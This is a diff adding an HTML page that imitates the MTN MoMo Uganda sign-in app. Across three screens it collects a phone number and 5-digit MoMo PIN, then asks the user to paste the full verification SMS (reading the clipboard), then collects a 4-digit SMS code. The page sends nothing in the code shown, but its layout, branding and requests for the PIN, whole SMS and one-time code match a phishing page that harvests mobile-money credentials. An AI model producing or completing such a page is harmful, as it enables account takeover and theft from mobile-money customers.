@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MTN MoMo Uganda - Login & Verification</title>
+  <style>
+    :root {
+      --mtn-yellow: #FFCC00;
+      --mtn-yellow-dark: #e6b800;
+      --mtn-blue: #004F71;
+      --mtn-dark: #1D1D1B;
+      --bg-light: #F7F8FA;
+      --border-color: #E0E0E0;
+      --text-muted: #6E7175;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #e9ecef;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* Mobile App Container */
+    .app-container {
+      width: 100%;
+      max-width: 400px;
+      min-height: 100vh;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      position: relative;
+      overflow: hidden;
+    }
+
+    @media (min-width: 480px) {
+      .app-container {
+        min-height: 750px;
+        border-radius: 28px;
+      }
+    }
+
+    /* Page View Switching */
+    .page-view {
+      display: none;
+      flex-direction: column;
+      flex: 1;
+      animation: fadeIn 0.25s ease-in-out;
+    }
+
+    .page-view.active {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateX(10px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+    /* Header Section */
+    .header {
+      background-color: var(--mtn-yellow);
+      padding: 40px 24px 32px;
+      border-bottom-left-radius: 28px;
+      border-bottom-right-radius: 28px;
+      text-align: center;
+      position: relative;
+    }
+
+    .back-btn {
+      position: absolute;
+      top: 18px;
+      left: 18px;
+      background: rgba(255, 255, 255, 0.45);
+      border: none;
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--mtn-dark);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .back-btn:hover {
+      background: rgba(255, 255, 255, 0.8);
+    }
+
+    .logo-badge {
+      display: inline-flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-color: var(--mtn-blue);
+      color: #ffffff;
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-weight: 800;
+      box-shadow: 0 4px 12px rgba(0, 79, 113, 0.25);
+      margin-bottom: 14px;
+    }
+
+    .logo-mtn {
+      font-size: 13px;
+      letter-spacing: 2px;
+      color: var(--mtn-yellow);
+      border: 1.5px solid var(--mtn-yellow);
+      border-radius: 20px;
+      padding: 1px 10px;
+      margin-bottom: 2px;
+    }
+
+    .logo-momo {
+      font-size: 22px;
+      letter-spacing: 0.5px;
+    }
+
+    .header h1 {
+      color: var(--mtn-dark);
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    .header p {
+      color: #333333;
+      font-size: 13px;
+      margin-top: 4px;
+    }
+
+    .step-pill {
+      display: inline-block;
+      background-color: var(--mtn-blue);
+      color: #ffffff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 12px;
+      border-radius: 12px;
+      margin-bottom: 10px;
+      letter-spacing: 0.5px;
+    }
+    /* Form Body */
+    .form-section {
+      padding: 32px 24px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    .input-label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--mtn-dark);
+      margin-bottom: 8px;
+    }
+
+    /* Phone Input + Country Selector Button */
+    .phone-wrapper {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid var(--border-color);
+      border-radius: 12px;
+      background-color: var(--bg-light);
+      transition: border-color 0.2s;
+      position: relative;
+    }
+
+    .phone-wrapper:focus-within {
+      border-color: var(--mtn-blue);
+      background-color: #ffffff;
+    }
+
+    .country-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: transparent;
+      border: none;
+      border-right: 1.5px solid var(--border-color);
+      padding: 14px 12px;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--mtn-dark);
+      border-top-left-radius: 12px;
+      border-bottom-left-radius: 12px;
+    }
+
+    .country-btn:hover {
+      background-color: rgba(0, 0, 0, 0.03);
+    }
+
+    .country-flag {
+      font-size: 18px;
+    }
+
+    .chevron {
+      font-size: 10px;
+      color: var(--text-muted);
+      margin-left: 2px;
+    }
+
+    .phone-input {
+      flex: 1;
+      border: none;
+      background: transparent;
+      padding: 14px 12px;
+      font-size: 16px;
+      font-weight: 500;
+      color: var(--mtn-dark);
+      outline: none;
+      width: 100%;
+    }
+
+    /* Country Dropdown Menu */
+    .country-dropdown {
+      position: absolute;
+      top: 108%;
+      left: 0;
+      width: 100%;
+      background: #ffffff;
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+      z-index: 100;
+      max-height: 220px;
+      overflow-y: auto;
+      display: none;
+    }
+
+    .country-dropdown.open {
+      display: block;
+    }
+
+    .country-option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px;
+      cursor: pointer;
+      font-size: 14px;
+      border-bottom: 1px solid #f2f2f2;
+    }
+
+    .country-option:last-child {
+      border-bottom: none;
+    }
+
+    .country-option:hover {
+      background-color: #fff9db;
+    }
+
+    .country-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 500;
+      color: var(--mtn-dark);
+    }
+
+    .country-dial {
+      color: var(--text-muted);
+      font-weight: 600;
+      font-size: 13px;
+    }
+
+    /* PIN Input */
+    .pin-wrapper {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid var(--border-color);
+      border-radius: 12px;
+      background-color: var(--bg-light);
+      padding-right: 12px;
+    }
+
+    .pin-wrapper:focus-within {
+      border-color: var(--mtn-blue);
+      background-color: #ffffff;
+    }
+
+    .pin-input {
+      flex: 1;
+      border: none;
+      background: transparent;
+      padding: 14px 14px;
+      font-size: 16px;
+      letter-spacing: 4px;
+      outline: none;
+      color: var(--mtn-dark);
+    }
+
+    .toggle-pin {
+      background: none;
+      border: none;
+      color: var(--mtn-blue);
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .forgot-link {
+      text-align: right;
+      margin-top: -10px;
+      margin-bottom: 24px;
+    }
+
+    .forgot-link a {
+      color: var(--mtn-blue);
+      font-size: 13px;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    /* Full SMS Textarea Styling (Page 1 SMS) */
+    .otp-info {
+      text-align: center;
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    .otp-info strong {
+      color: var(--mtn-dark);
+    }
+
+    .sms-box-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+
+    .paste-btn {
+      background-color: rgba(0, 79, 113, 0.1);
+      color: var(--mtn-blue);
+      border: none;
+      border-radius: 8px;
+      padding: 6px 12px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .paste-btn:hover {
+      background-color: rgba(0, 79, 113, 0.18);
+    }
+
+    .full-sms-textarea {
+      width: 100%;
+      min-height: 125px;
+      border: 1.5px solid var(--border-color);
+      border-radius: 12px;
+      background-color: var(--bg-light);
+      padding: 14px;
+      font-size: 14px;
+      line-height: 1.5;
+      color: var(--mtn-dark);
+      resize: none;
+      outline: none;
+      transition: border-color 0.2s, background-color 0.2s;
+      margin-bottom: 16px;
+    }
+
+    .full-sms-textarea:focus {
+      border-color: var(--mtn-blue);
+      background-color: #ffffff;
+    }
+
+    /* 4-Digit OTP Boxes Styling (Page 2 SMS) */
+    .otp-boxes {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .otp-digit {
+      width: 56px;
+      height: 60px;
+      border: 1.5px solid var(--border-color);
+      border-radius: 12px;
+      background-color: var(--bg-light);
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--mtn-dark);
+      outline: none;
+      transition: border-color 0.2s, background-color 0.2s;
+    }
+
+    .otp-digit:focus {
+      border-color: var(--mtn-blue);
+      background-color: #ffffff;
+      box-shadow: 0 0 0 3px rgba(0, 79, 113, 0.1);
+    }
+
+    .resend-box {
+      text-align: center;
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-bottom: 24px;
+    }
+
+    .resend-btn {
+      background: none;
+      border: none;
+      color: var(--mtn-blue);
+      font-weight: 700;
+      cursor: pointer;
+      font-size: 13px;
+      text-decoration: underline;
+    }
+
+    .resend-btn:disabled {
+      color: var(--text-muted);
+      text-decoration: none;
+      cursor: default;
+    }
+
+    /* Submit Button */
+    .btn-login {
+      width: 100%;
+      background-color: var(--mtn-yellow);
+      color: var(--mtn-dark);
+      border: none;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s;
+      box-shadow: 0 4px 10px rgba(255, 204, 0, 0.35);
+      margin-top: auto;
+    }
+
+    .btn-login:hover {
+      background-color: var(--mtn-yellow-dark);
+    }
+
+    .btn-login:active {
+      transform: scale(0.98);
+    }
+
+    .footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+
+    .footer a {
+      color: var(--mtn-blue);
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    /* Status Toast */
+    .toast {
+      position: absolute;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--mtn-blue);
+      color: #fff;
+      padding: 10px 18px;
+      border-radius: 20px;
+      font-size: 13px;
+      display: none;
+      white-space: nowrap;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      z-index: 200;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+
+    <!-- ==================== PAGE 1: LOGIN SCREEN ==================== -->
+    <div class="page-view active" id="pageLogin">
+      <div class="header">
+        <div class="logo-badge">
+          <span class="logo-mtn">MTN</span>
+          <span class="logo-momo">MoMo</span>
+        </div>
+        <h1>Welcome to MoMo</h1>
+        <p>Sign in with your mobile money number</p>
+      </div>
+
+      <form class="form-section" id="loginForm">
+        <div class="input-group">
+          <label class="input-label" for="phoneInput">Mobile Number</label>
+          <div class="phone-wrapper">
+            <button type="button" class="country-btn" id="countryBtn" aria-label="Select Country">
+              <span class="country-flag" id="selectedFlag">🇺🇬</span>
+              <span id="selectedCode">+256</span>
+              <span class="chevron">▼</span>
+            </button>
+
+            <input 
+              type="tel" 
+              id="phoneInput" 
+              class="phone-input" 
+              placeholder="77X XXX XXX" 
+              maxlength="9"
+              required
+            >
+
+            <div class="country-dropdown" id="countryDropdown">
+              <div class="country-option" data-flag="🇺🇬" data-code="+256" data-placeholder="77X XXX XXX">
+                <div class="country-info"><span>🇺🇬</span> <span>Uganda</span></div>
+                <span class="country-dial">+256</span>
+              </div>
+              <div class="country-option" data-flag="🇬🇭" data-code="+233" data-placeholder="24X XXX XXX">
+                <div class="country-info"><span>🇬🇭</span> <span>Ghana</span></div>
+                <span class="country-dial">+233</span>
+              </div>
+              <div class="country-option" data-flag="🇷🇼" data-code="+250" data-placeholder="78X XXX XXX">
+                <div class="country-info"><span>🇷🇼</span> <span>Rwanda</span></div>
+                <span class="country-dial">+250</span>
+              </div>
+              <div class="country-option" data-flag="🇿🇲" data-code="+260" data-placeholder="96X XXX XXX">
+                <div class="country-info"><span>🇿🇲</span> <span>Zambia</span></div>
+                <span class="country-dial">+260</span>
+              </div>
+              <div class="country-option" data-flag="🇨🇲" data-code="+237" data-placeholder="67X XXX XXX">
+                <div class="country-info"><span>🇨🇲</span> <span>Cameroon</span></div>
+                <span class="country-dial">+237</span>
+              </div>
+              <div class="country-option" data-flag="🇨🇮" data-code="+225" data-placeholder="05X XXX XXX">
+                <div class="country-info"><span>🇨🇮</span> <span>Côte d'Ivoire</span></div>
+                <span class="country-dial">+225</span>
+              </div>
+              <div class="country-option" data-flag="🇧🇯" data-code="+229" data-placeholder="97X XXX XXX">
+                <div class="country-info"><span>🇧🇯</span> <span>Benin</span></div>
+                <span class="country-dial">+229</span>
+              </div>
+              <div class="country-option" data-flag="🇸🇿" data-code="+268" data-placeholder="76X XXX XX">
+                <div class="country-info"><span>🇸🇿</span> <span>Eswatini</span></div>
+                <span class="country-dial">+268</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="input-group">
+          <label class="input-label" for="pinInput">MoMo PIN (5 Digits)</label>
+          <div class="pin-wrapper">
+            <input 
+              type="password" 
+              id="pinInput" 
+              class="pin-input" 
+              placeholder="•••••" 
+              inputmode="numeric" 
+              maxlength="5"
+              required
+            >
+            <button type="button" class="toggle-pin" id="togglePin">SHOW</button>
+          </div>
+        </div>
+
+        <div class="forgot-link">
+          <a href="#">Forgot PIN?</a>
+        </div>
+
+        <button type="submit" class="btn-login">SIGN IN</button>
+      </form>
+
+      <div class="footer">
+        Don't have a MoMo account? <a href="#">Register</a>
+      </div>
+    </div>
+
+    <!-- ==================== PAGE 2: COPY FULL SMS (STEP 1) ==================== -->
+    <div class="page-view" id="pageSms1">
+      <div class="header">
+        <button type="button" class="back-btn" onclick="showPage('pageLogin')">←</button>
+        <span class="step-pill">STEP 1 OF 2</span>
+        <h1>SMS Verification</h1>
+        <p>Copy and paste the full verification SMS</p>
+      </div>
+
+      <form class="form-section" id="smsForm1">
+        <p class="otp-info">
+          Copy the entire SMS message sent to<br>
+          <strong id="displayPhone1">+256 770 000 000</strong> and paste it below.
+        </p>
+
+        <div class="sms-box-header">
+          <label class="input-label" for="fullSmsInput" style="margin-bottom: 0;">Full SMS Message</label>
+          <button type="button" class="paste-btn" id="pasteSmsBtn">📋 Paste Full SMS</button>
+        </div>
+
+        <textarea 
+          id="fullSmsInput" 
+          class="full-sms-textarea" 
+          placeholder="Paste the full MTN MoMo SMS message here..."
+          required
+        ></textarea>
+
+        <div class="resend-box">
+          Didn't receive the SMS? <br>
+          <button type="button" class="resend-btn" id="resendBtn1" disabled>Resend SMS in 30s</button>
+        </div>
+
+        <button type="submit" class="btn-login">VERIFY SMS</button>
+      </form>
+    </div>
+
+    <!-- ==================== PAGE 3: 4-DIGIT SMS CODE (STEP 2) ==================== -->
+    <div class="page-view" id="pageSms2">
+      <div class="header">
+        <button type="button" class="back-btn" onclick="showPage('pageSms1')">←</button>
+        <span class="step-pill">STEP 2 OF 2</span>
+        <h1>Security Code</h1>
+        <p>Enter the 4-digit SMS verification code</p>
+      </div>
+
+      <form class="form-section" id="smsForm2">
+        <p class="otp-info">
+          Enter the 4-digit code sent via SMS to<br>
+          <strong id="displayPhone2">+256 770 000 000</strong>
+        </p>
+
+        <div class="otp-boxes" id="otpGroup2">
+          <input type="text" class="otp-digit" inputmode="numeric" maxlength="1" required>
+          <input type="text" class="otp-digit" inputmode="numeric" maxlength="1" required>
+          <input type="text" class="otp-digit" inputmode="numeric" maxlength="1" required>
+          <input type="text" class="otp-digit" inputmode="numeric" maxlength="1" required>
+        </div>
+
+        <div class="resend-box">
+          Didn't receive the 4-digit code? <br>
+          <button type="button" class="resend-btn" id="resendBtn2" disabled>Resend code in 30s</button>
+        </div>
+
+        <button type="submit" class="btn-login">CONFIRM &amp; CONTINUE</button>
+      </form>
+    </div>
+
+    <div class="toast" id="toast"></div>
+  </div>
+  <script>
+    const countryBtn = document.getElementById('countryBtn');
+    const countryDropdown = document.getElementById('countryDropdown');
+    const selectedFlag = document.getElementById('selectedFlag');
+    const selectedCode = document.getElementById('selectedCode');
+    const phoneInput = document.getElementById('phoneInput');
+    const countryOptions = document.querySelectorAll('.country-option');
+    const togglePin = document.getElementById('togglePin');
+    const pinInput = document.getElementById('pinInput');
+    const fullSmsInput = document.getElementById('fullSmsInput');
+    const pasteSmsBtn = document.getElementById('pasteSmsBtn');
+    const toast = document.getElementById('toast');
+
+    let timerInterval1, timerInterval2;
+
+    // Show toast notification
+    function showToast(message) {
+      toast.textContent = message;
+      toast.style.display = 'block';
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, 2800);
+    }
+
+    // Switch active screen
+    function showPage(pageId) {
+      document.querySelectorAll('.page-view').forEach(page => {
+        page.classList.remove('active');
+      });
+      document.getElementById(pageId).classList.add('active');
+    }
+
+    // Start 30-second countdown timer for resend buttons
+    function startCountdown(btnId, intervalRef, label) {
+      clearInterval(intervalRef);
+      const btn = document.getElementById(btnId);
+      let seconds = 30;
+      btn.disabled = true;
+      btn.textContent = `Resend ${label} in ${seconds}s`;
+
+      return setInterval(() => {
+        seconds--;
+        if (seconds > 0) {
+          btn.textContent = `Resend ${label} in ${seconds}s`;
+        } else {
+          clearInterval(intervalRef);
+          btn.disabled = false;
+          btn.textContent = `Resend ${label}`;
+        }
+      }, 1000);
+    }
+
+    // Paste full SMS from clipboard on Step 1
+    pasteSmsBtn.addEventListener('click', async () => {
+      try {
+        const text = await navigator.clipboard.readText();
+        if (text) {
+          fullSmsInput.value = text;
+          showToast('Full SMS pasted');
+        } else {
+          showToast('Clipboard is empty');
+        }
+      } catch (err) {
+        fullSmsInput.focus();
+        showToast('Long-press inside the box to paste SMS');
+      }
+    });
+
+    // Setup auto-focus & backspace navigation for 4-digit OTP boxes (Step 2)
+    function setupOtpInputs(groupId) {
+      const inputs = document.querySelectorAll(`#${groupId} .otp-digit`);
+      inputs.forEach((input, index) => {
+        input.addEventListener('input', () => {
+          input.value = input.value.replace(/[^0-9]/g, '');
+          if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        });
+
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+      });
+    }
+
+    setupOtpInputs('otpGroup2');
+
+    // Country dropdown logic
+    countryBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      countryDropdown.classList.toggle('open');
+    });
+
+    countryOptions.forEach(option => {
+      option.addEventListener('click', () => {
+        selectedFlag.textContent = option.dataset.flag;
+        selectedCode.textContent = option.dataset.code;
+        phoneInput.placeholder = option.dataset.placeholder;
+        countryDropdown.classList.remove('open');
+        phoneInput.focus();
+      });
+    });
+
+    document.addEventListener('click', () => {
+      countryDropdown.classList.remove('open');
+    });
+
+    // PIN visibility toggle
+    togglePin.addEventListener('click', () => {
+      if (pinInput.type === 'password') {
+        pinInput.type = 'text';
+        togglePin.textContent = 'HIDE';
+      } else {
+        pinInput.type = 'password';
+        togglePin.textContent = 'SHOW';
+      }
+    });
+
+    // Login Submit -> Go to Step 1 (Copy Full SMS)
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const fullNumber = `${selectedCode.textContent} ${phoneInput.value}`;
+      document.getElementById('displayPhone1').textContent = fullNumber;
+      document.getElementById('displayPhone2').textContent = fullNumber;
+
+      showPage('pageSms1');
+      fullSmsInput.focus();
+      timerInterval1 = startCountdown('resendBtn1', timerInterval1, 'SMS');
+      showToast('Verification SMS sent');
+    });
+
+    // Step 1 Submit -> Go to Step 2 (4-Digit Code)
+    document.getElementById('smsForm1').addEventListener('submit', (e) => {
+      e.preventDefault();
+      showPage('pageSms2');
+      document.querySelector('#otpGroup2 .otp-digit').focus();
+      timerInterval2 = startCountdown('resendBtn2', timerInterval2, 'code');
+      showToast('4-digit code sent');
+    });
+
+    // Step 2 Submit -> Complete
+    document.getElementById('smsForm2').addEventListener('submit', (e) => {
+      e.preventDefault();
+      showToast('Verification complete! Signing in...');
+    });
+
+    // Resend button click handlers
+    document.getElementById('resendBtn1').addEventListener('click', () => {
+      timerInterval1 = startCountdown('resendBtn1', timerInterval1, 'SMS');
+      showToast('Verification SMS resent');
+    });
+
+    document.getElementById('resendBtn2').addEventListener('click', () => {
+      timerInterval2 = startCountdown('resendBtn2', timerInterval2, 'code');
+      showToast('4-digit code resent');
+    });
+  </script>
+
+</body>
+</html>
